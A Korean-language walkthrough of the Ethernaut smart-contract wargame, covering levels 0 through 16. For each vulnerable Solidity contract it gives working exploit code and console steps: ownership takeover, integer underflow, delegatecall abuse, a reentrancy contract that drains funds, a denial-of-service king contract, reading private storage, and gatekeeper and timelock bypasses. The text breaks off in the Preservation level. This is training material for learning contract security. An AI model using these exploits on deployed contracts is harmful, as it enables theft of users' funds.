[{"content":" \u0026lsquo;Ethernaut\u0026rsquo; is a Web3/Solidity based wargame inspired on overthewire.org.\nThis article offers a brief summary and exploit code of each challenge.\n # 0. Hello Ethernaut \u0026gt; await contract.info() \u0026#39;You will find what you need in info1().\u0026#39; \u0026gt; await contract.info1(); \u0026#39;Try info2(), but with \u0026#34;hello\u0026#34; as a parameter.\u0026#39; \u0026gt; await contract.info2(\u0026#34;hello\u0026#34;); \u0026#39;The property infoNum holds the number of the next info method to call.\u0026#39; \u0026gt; await contract.infoNum(); o {negative: 0, words: Array(2), length: 1, red: null} length: 1 negative: 0 red: null words: (2) [42, empty] [[Prototype]]: Object \u0026gt; await contract.info42(); \u0026#39;theMethodName is the name of the next method.\u0026#39; \u0026gt; await contract.theMethodName(); \u0026#39;The method name is method7123949.\u0026#39; \u0026gt; await contract.method7123949(); \u0026#39;If you know the password, submit it to authenticate().\u0026#39; \u0026gt; await contract.password(); \u0026#39;ethernaut0\u0026#39; \u0026gt; await contract.authenticate(\u0026#34;ethernaut0\u0026#34;); // Submit  # 1. Fallback Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract Fallback { using SafeMath for uint256; mapping(address =\u0026gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner { require( msg.sender == owner, \u0026#34;caller is not the owner\u0026#34; ); _; } function contribute() public payable { require(msg.value \u0026lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] \u0026gt; contributions[owner]) { owner = msg.sender; } } function getContribution() public view returns (uint) { return contributions[msg.sender]; } function withdraw() public onlyOwner { owner.transfer(address(this).balance); } receive() external payable { // Vulnerable!  require(msg.value \u0026gt; 0 \u0026amp;\u0026amp; contributions[msg.sender] \u0026gt; 0); owner = msg.sender; } } 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.\n컨트랙트를 배포한 owner의 contributions 금액은 1000 Ether로 초기화되어 있으며, contribute() 함수만 본다면 해당 금액 이상의 contribute를 해야 컨트랙트의 owner가 될 수 있다. (1000 Ether도 없을 뿐더러, 한번 contribute 실행시마다 0.001 Ether씩만 보낼 수 있다.)\n컨트랙트에서 Ether를 송금받기 위해 존재하는 receive() 함수에 취약점이 존재한다. contribute를 한 사용자가 receive() 함수를 실행 시에 owner가 될 수 있도록 코드가 작성되어 있다.\nExploit \u0026gt; await contract.getContribution(); \u0026gt; await contract.contribute({from: player, value: toWei(\u0026#34;0.0001\u0026#34;)}); \u0026gt; await sendTransaction({from: player, to:contract.address, value: toWei(\u0026#34;0.0001\u0026#34;)}); \u0026gt; await contract.withdraw(); // Submit  # 2. Fallout Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract Fallout { using SafeMath for uint256; mapping (address =\u0026gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { // constructor function name typing mistake  owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, \u0026#34;caller is not the owner\u0026#34; ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] \u0026gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; } } 마찬가지로 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.\nconstuctor 주석이 가리키는 Fal1out()을 호출하면 된다.\nExploit \u0026gt; await contract.Fal1out({from: player, value: toWei(\u0026#34;0.000000000000000001\u0026#34;)}); // 1 wei  // Submit  # 3. Coin Flip Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } } } 10번 연속 동전던지기 결과를 맞춰야 하며, 동전던지기 결과는 uint256(blockhash(block.number.sub(1))) / FACTOR 로 계산한다. 또한 lastHash를 이용해, 동일 블록에 있는 트랜잭션은 revert() 시킨다.\nFACTOR 값은 uint256 타입이 가질 수 있는 최솟값과 최댓값의 중간 값이며, uint256(blockhash(block.number.sub(1)))는 트랜잭션이 포함된 블록의 이전 블록의 해시값을 uint256 타입으로 변환한 값이다.\n결과적으로 트랜잭션이 포함된 블록의 이전블록의 해시값을 uint256으로 타입변환한 값이 중간값을 기준으로 이하면 false, 이상이면 true로 계산된다.\n동전던지기 결과를 맞추기 위해 공격자가 전송하는 트랜잭션이 포함된 블록을 기준으로 결과값이 계산되므로, 값 예측이 가능하다.\nExploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; interface ICoinFlip { function flip(bool _guess) external returns (bool); } contract CoinFlipExploit { using SafeMath for uint256; address coinflip; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor (address _coinflip) public { coinflip = _coinflip; } function exploit() public { uint256 blockValue = uint256(blockhash(block.number.sub(1))); uint256 coinFlip = blockValue.div(FACTOR); bool answer = coinFlip == 1 ? true : false; ICoinFlip(coinflip).flip(answer); } }  # 4. Telephone Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.\nchangeOwner()는 tx.origin과 msg.sender이 일치하지 않는 경우, 인자로 전달된 주소에게 ownership을 부여한다.\n공격자가 컨트랙트를 통하여 changeOwner()를 호출하면 된다.\n tx.origin = 트랜잭션을 최초 생성 및 시작한 주소 -\u0026gt; 공격자 EOA 주소 msg.sender = 컨트랙트의 함수를 호출한 주소 -\u0026gt; 공격자 컨트랙트 주소  Exploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface ITelephone { function changeOwner(address _owner) external; } contract TelephoneExploit { address newOwner; address telephoneAddr; constructor (address _telephoneAddr, address _newOwner) public { telephoneAddr = _telephoneAddr; newOwner = _newOwner; } function exploit() public { ITelephone(telephoneAddr).changeOwner(newOwner); } }  # 5. Token Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token { mapping(address =\u0026gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value \u0026gt;= 0); // bypass (Integer Underflow)  balances[msg.sender] -= _value; // Token++++++++ (Integer Underflow)  balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; } } 공격자에게 20개의 토큰이 주어지는데, 컨트랙트의 취약점을 이용해 최대한 많은 수의 토큰을 확보하는 것이 목표이다.\nSolidity 0.8.0 미만 버전은 Integer Overflow/Underflow 발생 시, 에러없이 트리거가 된다.\n21개를 임의의 주소로 전송하면, Integer Overflow(20 - 21)에 의해, 공격자는 2**256 - 1개 토큰을 갖게된다.\nExploit \u0026gt; contract.balanceOf(player); Promise {\u0026lt;pending\u0026gt;, _events: o, emit: ƒ, on: ƒ, …} ... [[PromiseResult]]: o length: 1 negative: 0 red: null words: (2) [20, empty] // 20 Token [[Prototype]]: Object \u0026gt; await contract.transfer(contract.address, toWei(\u0026#34;21\u0026#34;)); \u0026gt; contract.balanceOf(player); Promise {\u0026lt;pending\u0026gt;, _events: o, emit: ƒ, on: ƒ, …} ... [[PromiseResult]]: o length: 10 negative: 0 red: null words: Array(11) // 2**256 - 1 Token 0: 13369364 1: 4247761 2: 67104201 3: 67108863 4: 67108863 5: 67108863 6: 67108863 7: 67108863 8: 67108863 9: 4194303 length: 11 [[Prototype]]: Array(0) [[Prototype]]: Object // Submit  # 6. Delegation Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } } } 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.\nDelegation 컨트랙트의 fallback()에서 delegatecall(msg.data)를 사용하여 Delegate 컨트랙트를 호출한다.\nmsg.data에 pwn() 함수를 호출하는 abi 값을 전달하여, Delegate 컨트랙트의 pwn()을 호출하고 ownership을 획득할 수 있다.\nExploit \u0026gt; let payload = web3.eth.abi.encodeFunctionSignature(\u0026#39;pwn()\u0026#39;) \u0026gt; await sendTransaction({from: player, to:contract.address, data: payload}); // Submit  # 7. Force Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */} 위 컨트랙트의 잔고는 다음과 같이 0인 상태인데, 0보다 큰 잔액을 만드는 것이 목표이다.\n\u0026gt; await getBalance(contract.address) \u0026#39;0\u0026#39; fallback()이나 receive() 함수가 구현되어 있다면, 다음과 같이 보내면 되지만 그렇지 않은 상황이기 때문에 다른 방법이 필요하다. (아래 트랜잭션 전송 시, 에러 발생)\n\u0026gt; sendTransaction({from: player, to:contract.address, value: toWei(\u0026#34;0.000000000000000002\u0026#34;)}); selfdestruct(address dest) 함수를 이용한 컨트랙트를 통해 대상 컨트랙트에 강제로 Ether를 송신할 수 있다.\n selfdestruct() 호출 시, 컨트랙트 스스로를 파괴하고 컨트랙트가 가진 Ether를 address dest로 송신  Exploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract ForceExploit { function exploit(address payable _forceAddr) payable public { require(msg.value \u0026gt; 1 wei); selfdestruct(_forceAddr); } } \u0026gt; await getBalance(contract.address) \u0026#39;0.000000000000000002\u0026#39;  # 8. Vault summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Vault { bool public locked; // slot 0 : 1 byte  bytes32 private password; // slot 1 : 32 bytes  constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } private으로 저장되어 있는 bytes32 타입의 password 값을 unlock()에 전달하는 것이 목표이다.\n기본적으로 storage 영역에 저장되는 변수들은 32 bytes 기준으로 slot 0부터 할당되어 저장되며, private으로 선언되더라도 값을 확인할 수 있다.\nExploit \u0026gt; const hexPassword = await web3.eth.getStorageAt(contract.address, 1); \u0026gt; hexPassword \u0026#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29\u0026#39; \u0026gt; await web3.utils.hexToAscii(hexPassword) \u0026#39;A very strong secret password :)\u0026#39; \u0026gt; await contract.unlock(hexPassword); // Submit  # 9. King Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value \u0026gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; } } 대상 컨트랙트의 기능이 동작하지 않는 DoS(Denial of Service) 상태로 만드는 것이 목표이다.\n컨트랙트는 receive()를 통해 Ether를 송금받을 수 있으며 다음과 같이 동작한다.\n (1) 기존의 prize보다 높은 Ether를 송금한 사람이 새로운 king이 된다. (2) 기존의 king에게는 새로운 king이 송금한 Ether를 전송해준다.  공격자가 컨트랙트를 생성하여 king으로 만들고, 해당 컨트랙트의 receive() 함수에서 무조건 revert() 를 호출하도록 하면된다.\nKing 컨트랙트는 다른 사용자들이 높은 Ether를 송금하더라도, 기존의 King인 공격자 컨트랙트에게 Ether를 송금하는 king.transfer(msg.value); 부분에서 revert()가 발생하여 DoS 상태에 빠진다.\n초기 owner, king 및 prize는 아래와 같다.\n\u0026gt; await contract.owner() \u0026#39;0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5\u0026#39; \u0026gt; await contract._king() \u0026#39;0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5\u0026#39; \u0026gt; fromWei(await contract.prize()) \u0026#39;0.001\u0026#39; Exploit Solidity Withdrawal Pattern 참고\n// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract KingExploit { function exploit(address payable targetAddr) public payable { (bool result, ) = targetAddr.call.value(msg.value)(\u0026#34;\u0026#34;); if(!result) revert(\u0026#34;Failed to become a king..!\u0026#34;); } receive() external payable { revert(\u0026#34;DoS\u0026#34;); } }  Deploy 후 exploit() 함수 호출 시, _kingAddr에 King 컨트랙트의 인스턴스 주소를 입력하고 msg.value는 0.001보다 큰 값(ex. 0.01, 0.002 등)을 입력한다.  \u0026gt; await contract.owner() \u0026#39;0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5\u0026#39; \u0026gt; await contract._king() \u0026#39;0x2cfc9a56e5223f453ddFDd942Fa1B305b257650E\u0026#39; \u0026gt; fromWei(await contract.prize()) \u0026#39;0.002\u0026#39; // Submit  # 10. Re-entrancy Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract Reentrance { using SafeMath for uint256; mapping(address =\u0026gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] \u0026gt;= _amount) { // Check  (bool result,) = msg.sender.call{value:_amount}(\u0026#34;\u0026#34;); // Interaction  if(result) { _amount; } balances[msg.sender] -= _amount; // Effects  } } receive() external payable {} } 대상 컨트랙트가 가진 모든 자금을 가져오는 것이 목표이다.\nChecks-Effects Interfaction 패턴이 적용되지 않아 전형적인 Re-Entrancy 공격에 취약한 코드이다.\n이에 따라 공격자는 fallback()이나 receive() 등을 이용해 대상 컨트랙트의 withdraw()를 연속적으로 재호출할 수 있다.\nExploit \u0026gt; await getBalance(contract.address) \u0026#39;0.001\u0026#39; 현재 컨트랙트가 가진 잔액은 0.001 ETH\n// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IReentrace { function donate(address _to) external payable; function balanceOf(address _who) external view returns (uint balance); function withdraw(uint _amount) external; } contract ReentranceExploit { address payable reentranceAddr; address payable attackerEOA; constructor (address payable _reentranceAddr) public { reentranceAddr = _reentranceAddr; attackerEOA = msg.sender; } function exploit() external payable { require(msg.value == 0.001 ether); IReentrace(reentranceAddr).donate.value(0.001 ether)(address(this)); IReentrace(reentranceAddr).withdraw(0.001 ether); } function getBalance() public view returns (uint256) { return address(this).balance; } function getTargetBalance() public view returns (uint256) { return reentranceAddr.balance; } function self_destruct() external { require(msg.sender == attackerEOA); selfdestruct(attackerEOA); } receive() external payable { if (reentranceAddr.balance \u0026gt;= 0.001 ether) { IReentrace(reentranceAddr).withdraw(0.001 ether); } } } ReentranceExploit 컨트랙트의 exploit() 호출 시, 다음 공격 흐름이 Reentrance 컨트랙트의 잔고가 바닥이 날 때까지 반복된다.\n (1) ReentranceExploit 컨트랙트의 주소를 이용해 0.001 ETH donate()  Reentrance 컨트랙트의 balances[ReentranceExploitAddress] = 0.001 ETH   (2) withdraw(0.001 ether)를 호출하여 donation한 금액 출금 요청 (3) ReentranceExploit 컨트랙트의 receive() 함수가 ETH를 수신하기 위해 호출됨 (4) receive()에서 withdraw()를 다시 호출  이후 self_destruct() 함수를 호출하여, 가져온 자금들을 공격자 EOA로 송금해주면 된다!\n// ReentranceExploit Contract Deploy  // exploit()  \u0026gt; await getBalance(contract.address) \u0026#39;0\u0026#39; // Submit  # 11. Elevator Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Building { function isLastFloor(uint) external returns (bool); } contract Elevator { bool public top; // false  uint public floor; // 0  function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } } bool 타입의 top을 true로 만드는 것이 목표이다.\nElevator 컨트랙트는 goTo() 함수를 제공하며, 입력된 _floor를 msg.sender의 isLastFloor() 인터페이스에 전달하여 결과를 수신한다.\nExploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IElevator { // function  function goTo(uint _floor) external; // variable  function floor() external returns (uint); } contract ElevatorExploit { address targetAddr; constructor (address _targetAddr) public { targetAddr = _targetAddr; } function exploit(uint _inputFloor) external { IElevator(targetAddr).goTo(_inputFloor); } function isLastFloor(uint _floor) external returns (bool){ if(IElevator(targetAddr).floor() != _floor) { return false; } else { return true; } } } 공격자가 입력한 층이 무조건 Last Floor 및 Top이 되도록 하는 isLastFloor() 인터페이스를 구현하면 된다.\n exploit() 함수에 공격자가 Top이 되도록 원하는 값을 입력  \u0026gt; await contract.top() false \u0026gt; await contract.floor() o {negative: 0, words: Array(2), length: 1, red: null} length: 1 negative: 0 red: null words: (2) [0, empty] [[Prototype]]: Object // exploit(50)  \u0026gt; await contract.top() true \u0026gt; await contract.floor() o {negative: 0, words: Array(2), length: 1, red: null} length: 1 negative: 0 red: null words: (2) [50, empty] [[Prototype]]: Object // Submit  # 12. Privacy Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^` .,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*., *.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^ ,---/V\\ `*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*. ~|__(o.o) ^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39; UU UU */ } 8. Vault 문제와 같이 private으로 선언하더라도 storage 영역에 저장된 값은 확인이 가능하다.\n대상 컨트랙트의 bytes32[3] data fixed array의 마지막 요소인 data[2]에 저장되어 있는 키 값을 찾아야한다.\nPrivacy 컨트랙트의 storage 영역의 값들은 다음과 같은 슬롯에 할당된다.\nbool public locked = true; // slot 0 : 1 bytes uint256 public ID = block.timestamp; // slot 1 : 32 bytes uint8 private flattening = 10; // slot 2 : 1 bytes uint8 private denomination = 255; // slot 2 : 1 bytes uint16 private awkwardness = uint16(now); // slot 2 : 2 bytes bytes32[3] private data; // slot 3 : data[0] // slot 4 : data[1] // slot 5 : data[2] Exploit \u0026gt; await web3.eth.getStorageAt(contract.address, 0); \u0026#39;0x0000000000000000000000000000000000000000000000000000000000000001\u0026#39; \u0026gt; await web3.eth.getStorageAt(contract.address, 1); \u0026#39;0x0000000000000000000000000000000000000000000000000000000062011490\u0026#39; \u0026gt; await web3.eth.getStorageAt(contract.address, 2); \u0026#39;0x000000000000000000000000000000000000000000000000000000001490ff0a\u0026#39; \u0026gt; await web3.eth.getStorageAt(contract.address, 3); \u0026#39;0x3edd311ebeeb5f8c81ac1d7ded889b1dc76be556554cef0c35cdb8c4121fce96\u0026#39; \u0026gt; await web3.eth.getStorageAt(contract.address, 4); \u0026#39;0xabaab090eedbeb41c34eebd1053d50f6d643142476fa67ba9ab668b8fff808c6\u0026#39; \u0026gt; await web3.eth.getStorageAt(contract.address, 5); // bytes32 data[2] \u0026#39;0x454b326e527ce34b20304b322983ab4030370380dfad9c0f1e40907c51851341\u0026#39; \u0026gt; data2 = await web3.eth.getStorageAt(contract.address, 5); \u0026#39;0x454b326e527ce34b20304b322983ab4030370380dfad9c0f1e40907c51851341\u0026#39; \u0026gt; data2_ascii = web3.utils.hexToAscii(data2) \u0026#39;EK2nR|ãK 0K2)\\x83«@07\\x03\\x80ß­\\x9C\\x0F\\x1E@\\x90|Q\\x85\\x13A\u0026#39; \u0026gt; key = web3.utils.asciiToHex(data2_ascii.substr(0, data2_ascii.length / 2)) \u0026#39;0x454b326e527ce34b20304b322983ab40\u0026#39; await contract.unlock(key) // Submit  # 13. Gatekeeper One Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract GatekeeperOne { using SafeMath for uint256; address public entrant; modifier gateOne() { require(msg.sender != tx.origin); // using contracts  _; } modifier gateTwo() { require(gasleft().mod(8191) == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \u0026#34;GatekeeperOne: invalid gateThree part one\u0026#34;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \u0026#34;GatekeeperOne: invalid gateThree part two\u0026#34;); require(uint32(uint64(_gateKey)) == uint16(tx.origin), \u0026#34;GatekeeperOne: invalid gateThree part three\u0026#34;); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } GateKeeperOne 컨트랙트의 enter() 함수를 호출하여 address entrant에 tx.origin 값을 저장하면 통과할 수 있다.\nenter() 함수에는 gateOne / gateTwo / gateThree 와 같이 3개의 modifier(함수 제어자)가 적용되어 있으며, 해당 함수 제어자들의 조건을 만족시켜야 함수 내부의 코드가 실행된다.\ngateOne()\n msg.sender와 tx.origin이 다른 주소여야 하므로, 컨트랙트를 통해 enter()를 호출하면 조건을 만족할 수 있다.  gateTwo()\n  gateTwo() 호출 시점에 남아있는 잔여 가스인 gasleft() 에 modular 8191 연산의 결과가 0이어야 한다.\n  Brute-Force를 통해 해결했다.\n  gateThree()\n enter() 함수로 전달된 bytes8 _gateKey의 상위부터 5,6번째 바이트는 00 00 이어야 하고, 7,8번째 바이트는 tx.origin(공격자 EOA) 주소의 하위 2바이트 값과 동일해야 한다.  Exploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract GatekeeperOneExploit { address targetAddr; uint64 public gatekeyUint = uint64(uint256(uint160(msg.sender)) \u0026amp; 0xFFFFFFFF0000FFFF); bytes8 public gatekey = bytes8(gatekeyUint); constructor (address _targetAddr) public { targetAddr = _targetAddr; } function exploit() external returns (bool){ bytes memory payload = abi.encodeWithSignature(\u0026#34;enter(bytes8)\u0026#34;, gatekey); for(uint16 i=0 ; i\u0026lt;1000 ; i++){ (bool bSuccess, bytes memory data) = targetAddr.call.gas(i + 8191*5)(payload); if(bSuccess){ return true; } } } } \u0026gt; await contract.entrant() \u0026#39;0x0000000000000000000000000000000000000000\u0026#39; // GatekeeperOneExploit Contract Deploy  // exploit()  \u0026gt; await contract.entrant() \u0026#39;0x--------------AttackerEOA---------------\u0026#39; // Submit  # 14. Gatekeeper Two Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } 이전 문제와 마찬가지로 enter() 함수를 호출하여 address entrant에 tx.origin 값을 저장하면 통과할 수 있으며, 3개의 modifier를 만족시켜야 한다.\ngateOne()\n msg.sender와 tx.origin이 다른 주소여야 하므로, 컨트랙트를 통해 enter()를 호출하면 조건을 만족할 수 있다.  gateTwo()\n  extcodesize()는 인자로 전달된 계정의 코드 사이즈를 반환하는 함수이므로, 호출한 컨트랙트의 코드 사이즈가 0이어야 한다.\n  이더리움 yellow paper에 따르면, constructor() 호출 시점에 코드 사이즈는 0으로 계산된다.\n  공격자 컨트랙트의 constructor()에서 enter()를 호출하면 된다.\n  gateThree()\n msg.sender(공격자 컨트랙트 주소)를 해시한 값의 하위 8바이트 값과 _gateKey XOR 연산의 결과가 2**64-1이 되어야 한다.  Exploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract GatekeeperTwoExploit { bytes8 public gatekey; constructor (address _targetAddr) public { gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)); _targetAddr.call(abi.encodeWithSignature(\u0026#34;enter(bytes8)\u0026#34;, gatekey)); } } \u0026gt; await contract.entrant() \u0026#39;0x0000000000000000000000000000000000000000\u0026#39; // GatekeeperTwoExploit Contract Deploy  \u0026gt; await contract.entrant() \u0026#39;0x--------------AttackerEOA---------------\u0026#39; // Submit  # 15. Naught Coin Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#39;; contract NaughtCoin is ERC20 { // string public constant name = \u0026#39;NaughtCoin\u0026#39;;  // string public constant symbol = \u0026#39;0x0\u0026#39;;  // uint public constant decimals = 18;  uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20(\u0026#39;NaughtCoin\u0026#39;, \u0026#39;0x0\u0026#39;) public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY;  // _balances[player] = INITIAL_SUPPLY;  _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() { if (msg.sender == player) { require(now \u0026gt; timeLock); _; } else { _; } } } player에게 ERC20 기반의 NaughtCoin 토큰 1,000,000개가 지급되었는데, transfer() 함수에 lockTokens() 제어자를 적용하여 10년동안 다른 지갑으로 옮기지 못하도록 설정되어 있다.\ntransfer() 함수는 super.trasnfer()에 의해 상속받은 ERC20의 transfer() 함수를 호출하게 된다.\nERC20에서는 토큰을 전송하기 위해 transfer() 이외에 approve() / transferFrom() 함수가 있다.\n해당 기능을 이용해 lockup periods를 우회하여 토큰 전송이 가능하다.\nExploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#39;; contract NaughtCoinExploit { uint256 public INITIAL_SUPPLY = 1000000 * (10**18); address public player; ERC20 public naughtCoin; constructor(address _player, address _naughtCoinAddress) public { player = _player; naughtCoin = ERC20(_naughtCoinAddress); } function exploit() external { naughtCoin.transferFrom(player, address(this), INITIAL_SUPPLY); } } \u0026gt; let initial_supply = await contract.balanceOf(player); \u0026gt; web3.utils.fromWei(initial_supply); \u0026#39;1000000\u0026#39; \u0026gt; web3.utils.fromWei(await contract.balanceOf(\u0026#34;0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB\u0026#34;)); \u0026#39;0\u0026#39; \u0026gt; await contract.approve([ExploitContractAddress], initial_supply); // await contract.approve(\u0026#34;0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB\u0026#34;, initial_supply);  // Exploit Contract Deploy \u0026amp; call exploit()  \u0026gt; web3.utils.fromWei(await contract.balanceOf(player)); \u0026#39;0\u0026#39; \u0026gt; web3.utils.fromWei(await contract.balanceOf(\u0026#34;0x4a81672E4952097EFE35Ee835e36F72cFF8eFDaB\u0026#34;)); \u0026#39;1000000\u0026#39; // Submit  # 16. Preservation Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Preservation { // public library contracts  address public timeZone1Library; // slot 0  address public timeZone2Library; // slot 1  address public owner; // slot 2  uint storedTime; // slot 3  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256(\u0026#34;setTime(uint256)\u0026#34;)); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public { timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; } // set the time for timezone 1  function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } // set the time for timezone 2  function setSecondTime(uint _timeStamp) public { timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp  uint storedTime; // slot 0  function setTime(uint _time) public { storedTime = _time; } } Preservation 컨트랙트는 constructor() 에서 setTime() 함수를 포함하고 있는 2개의 timeZomeLibrary 컨트랙트 주소를 입력받는다.\nsetFirstTime() 호출 시, 첫번째 timeZone1Library::setTime()을 delegatecall()로 호출하여 인자로 전달된 타임스탬프 값을 설정하고, setSecondTime() 호출 시, 두번째 timeZone2Library::setTime()을 delegatecall()로 호출하여 인자로 전달된 타임스탬프 값을 설정한다.\n위 컨트랙트의 owner 